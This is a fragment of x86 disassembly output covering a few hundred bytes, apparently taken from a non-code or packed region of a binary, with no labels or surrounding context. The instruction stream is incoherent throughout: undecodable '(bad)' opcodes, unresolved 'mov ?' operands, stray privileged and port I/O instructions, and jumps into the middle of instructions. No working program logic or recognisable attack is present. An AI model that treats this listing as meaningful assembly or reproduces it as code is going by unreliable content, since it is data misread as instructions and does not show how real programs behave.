  428331:	imul   ecx,DWORD PTR [esi-0x50ce1b34],0xfffffff3
  428338:	dec    edi
  428339:	inc    edi
  42833a:	adc    al,bl
  42833c:	push   eax
  42833d:	or     al,0xe4
  42833f:	mov    dh,0x3c
  428341:	xchg   ebp,eax
  428342:	xor    ecx,DWORD PTR [esi+0x3ad6c6bf]
  428348:	pop    es
  428349:	and    eax,ecx
  42834b:	cmp    edi,DWORD PTR [edi+0x0]
	...
  428359:	add    ch,bh
  42835b:	cmp    DWORD PTR ds:0xfd1cf514,esi
  428361:	stc    
  428362:	jl     0x428396
  428364:	stc    
  428365:	jne    0x428320
  428367:	jp     0x428343
  428369:	lock loope 0x428363
  42836c:	add    DWORD PTR [eax],eax
  42836e:	sti    
  42836f:	add    DWORD PTR [eax],eax
  428371:	add    BYTE PTR [ebx-0x198ee8f],al
  428377:	lock hlt 
  428379:	jmp    0x1f62020e
  42837e:	fidiv  DWORD PTR [esi+ecx*1]
  428381:	jmp    0x4283f5
  428383:	pop    ss
  428384:	jno    0x4283c6
  428386:	mov    ebx,0x81ad75bc
  42838b:	aad    0xf4
  42838d:	dec    edi
  42838e:	push   ds
  42838f:	daa    
  428390:	je     0x4283cb
  428392:	addr16 add dl,ch
  428395:	sbb    DWORD PTR ss:[edx-0xcb9a70c],edi
  42839c:	mov    bh,0xef
  42839e:	add    dl,BYTE PTR [ebx]
  4283a0:	imul   esp,DWORD PTR [edx+0x4b65f5ec],0xffffffbe
  4283a7:	add    ah,BYTE PTR [esi]
  4283a9:	std    
  4283aa:	daa    
  4283ab:	dec    eax
  4283ac:	mov    DWORD PTR [esi+ebp*4],0xc34ce70c
  4283b3:	add    dl,BYTE PTR [ebx-0x4d]
  4283b6:	arpl   WORD PTR [edx+ebx*8+0x3f41c49d],si
  4283bd:	jg     0x428433
  4283bf:	mov    ebp,0xe36a791b
  4283c4:	push   cs
  4283c5:	pop    ds
  4283c6:	inc    edx
  4283c7:	ret    
  4283c8:	rcl    BYTE PTR [edx],1
  4283ca:	dec    esp
  4283cb:	ret    
  4283cc:	ds jbe 0x42841c
  4283cf:	test   BYTE PTR [eax],al
  4283d1:	in     al,dx
  4283d2:	scas   al,BYTE PTR es:[edi]
  4283d3:	js     0x428436
  4283d5:	add    al,0x2d
  4283d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4283d8:	sub    ch,BYTE PTR [ecx-0x29f8cf0b]
  4283de:	add    ch,0xf
  4283e1:	mov    ah,0x5b
  4283e3:	sbb    DWORD PTR [eax+0x29],eax
  4283e6:	and    ebx,DWORD PTR [ebx-0x7d4ead89]
  4283ec:	xor    DWORD PTR [ebp-0x72a50fb5],ecx
  4283f2:	mov    WORD PTR [eax],fs
  4283f4:	dec    edi
  4283f5:	enter  0x9a88,0x17
  4283f9:	mov    dl,0xa6
  4283fb:	sub    bh,BYTE PTR [edi+0x1c]
  4283fe:	mov    ds:0x6946b41a,eax
  428403:	xchg   DWORD PTR [bx+si-0x10],ebp
  428407:	icebp  
  428408:	fdivrp st(7),st
  42840a:	test   al,0x74
  42840c:	dec    ebx
  42840d:	sbb    al,BYTE PTR [esi-0x75c0b00]
  428413:	retf   
  428414:	pop    ds
  428415:	xlat   BYTE PTR ds:[ebx]
  428416:	sbb    esp,DWORD PTR [ebp+ebx*1-0x2a549d3a]
  42841d:	ja     0x4283bd
  42841f:	inc    ebp
  428420:	adc    DWORD PTR [esi],0x60
  428423:	push   ss
  428424:	xchg   ebx,eax
  428425:	add    al,0xdc
  428427:	xchg   ebx,eax
  428428:	sahf   
  428429:	xor    al,dh
  42842b:	test   DWORD PTR [edi],ebp
  42842d:	in     eax,0xc4
  42842f:	and    ebx,DWORD PTR [ebx]
  428431:	xchg   ecx,eax
  428432:	xor    eax,0x40492ed4
  428437:	or     DWORD PTR [ebx+0x2a10bd33],eax
  42843d:	push   es
  42843e:	add    eax,DWORD PTR [edi]
  428440:	sbb    eax,0xf4767aa8
  428445:	ja     0x428427
  428447:	fisub  WORD PTR [ebx]
  428449:	ficomp WORD PTR [eax-0x48]
  42844c:	retf   0xc138
  42844f:	lods   eax,DWORD PTR ds:[esi]
  428450:	jnp    0x4284b4
  428452:	dec    esp
  428453:	js     0x4283f8
  428455:	jnp    0x4284b4
  428457:	les    eax,FWORD PTR [ebx-0x54]
  42845a:	call   0xf08f:0x3e4dc825
  428461:	in     al,dx
  428462:	xchg   ebx,eax
  428463:	xchg   esi,eax
  428464:	leave  
  428465:	xor    dl,BYTE PTR [ebp+ebx*8+0x2231fb95]
  42846c:	cmp    dh,BYTE PTR [edx+eiz*2-0x86257d7]
  428473:	cwde   
  428474:	rol    dh,0xd2
  428477:	mov    edi,0x274d0512
  42847c:	jle    0x4284c0
  42847e:	ins    BYTE PTR es:[edi],dx
  42847f:	mov    ds:0xd30b506a,eax
  428484:	bnd js 0x428441
  428487:	not    BYTE PTR [edi+ebp*2]
  42848a:	push   cs
  42848b:	popa   
  42848c:	mov    bh,0xa1
  42848e:	jl     0x428442
  428490:	lock push esp
  428492:	and    al,0xbe
  428494:	or     al,0x65
  428496:	out    dx,al
  428497:	clc    
  428498:	inc    edi
  428499:	(bad)  
  42849a:	ror    BYTE PTR [edi+ebp*4+0x3b963661],1
  4284a1:	push   0xffffffc1
  4284a3:	inc    ebp
  4284a4:	mov    ?,edi
  4284a6:	jnp    0x428500
  4284a8:	mov    ?,WORD PTR [esi-0x37668f18]
  4284ae:	imul   esp,DWORD PTR [eax+0x636964b8],0xcf22b460
  4284b8:	and    eax,DWORD PTR [ebx+ecx*4-0xe5f9e00]
  4284bf:	xchg   ebx,eax
  4284c0:	add    ebx,DWORD PTR [ebx-0x78]
  4284c3:	cmp    eax,0x25fe16ac
  4284c8:	dec    edx
  4284c9:	dec    eax
  4284ca:	jne    0x428477
  4284cc:	ret    
  4284cd:	and    bl,BYTE PTR [ebp+0x53e4144a]
  4284d3:	adc    al,0x0
  4284d5:	xor    eax,0xe12ba0b1
  4284da:	out    dx,al
  4284db:	int3   
  4284dc:	popf   
  4284dd:	push   0x4f1d971f
  4284e2:	shl    BYTE PTR [edx],0xc3
  4284e5:	arpl   WORD PTR [edi+0x7c],bx
  4284e8:	xchg   BYTE PTR [ebx+0x1b6f8759],ah
  4284ee:	and    al,0xb2
  4284f0:	test   BYTE PTR [ebx],0xf6
  4284f3:	repz pop ecx
  4284f5:	jbe    0x42850c
  4284f7:	arpl   WORD PTR [esi-0x1a8635a0],ax
  4284fd:	sbb    esi,DWORD PTR [edx+0x5b]
  428500:	xor    al,0xb6
  428502:	jp     0x4284f8
  428504:	push   esi
  428505:	and    al,0x62
  428507:	sbb    al,0x7e
  428509:	mov    esp,0x374c3e5d
  42850e:	mov    al,ds:0xcc0bbec1
  428513:	xchg   edx,eax
  428514:	stos   BYTE PTR es:[edi],al
  428515:	xchg   esi,eax
  428516:	dec    ebx
  428517:	xchg   esi,eax
  428518:	out    0xa3,eax
  42851a:	(bad)  
  42851b:	sub    al,BYTE PTR [edx]
  42851d:	pusha  
  42851e:	and    ah,cl
  428520:	daa    
  428521:	jge    0x42854a
  428523:	sbb    BYTE PTR [edi-0x68],bl
  428526:	cmp    eax,0x17c2e2a9
  42852b:	arpl   WORD PTR [ebx+0x6d068d9a],ax
  428531:	ja     0x42856a
  428533:	ja     0x428549
  428535:	pop    esp
  428536:	enter  0xfcf7,0x52
  42853a:	push   0x20
  42853c:	jle    0x4284f4
  42853e:	push   eax
  42853f:	shl    BYTE PTR [edi+ebp*1-0x6736f8e4],0xc5
  428547:	fs stos BYTE PTR es:[edi],al
  428549:	jns    0x428596
  42854b:	pop    ecx
  42854c:	dec    edi
  42854d:	call   0xb2f99ef9
  428552:	jne    0x4285ad
  428554:	mov    ?,WORD PTR [edx]
  428556:	or     al,0x13
  428558:	outs   dx,BYTE PTR ds:[esi]
  428559:	stc    
  42855a:	mov    ?,WORD PTR [edi-0x4ac26f9b]
  428560:	jp     0x4285a1
  428562:	mov    cl,0xa4
  428564:	xchg   ebx,eax
  428565:	(bad)  
  428566:	xchg   edx,eax
  428567:	and    esi,ecx
  428569:	shl    edx,1
  42856b:	inc    ebx
  42856c:	push   edi
	...
  428579:	add    BYTE PTR [ecx-0x7d39faf],ch
  42857f:	cmp    eax,0x65b9d5ed
  428584:	test   BYTE PTR [ecx+0x249c9a2a],ch
  42858a:	fdiv   st(1),st
  42858c:	add    DWORD PTR [eax],eax
  42858e:	sbb    al,0x0
  428590:	add    BYTE PTR [eax],al
  428592:	(bad)  
  428593:	addr16 push ds
  428595:	and    eax,0x3800608b
  42859a:	pop    esp
  42859b:	xor    eax,0x74ef8457
  4285a0:	in     eax,dx
  4285a1:	pop    ss
  4285a2:	adc    dh,cl
  4285a4:	dec    ecx
  4285a5:	dec    ecx
  4285a6:	pushf  
  4285a7:	xchg   ebx,eax
  4285a8:	push   esp
  4285a9:	and    BYTE PTR ds:0x1878b7,0x0
	...
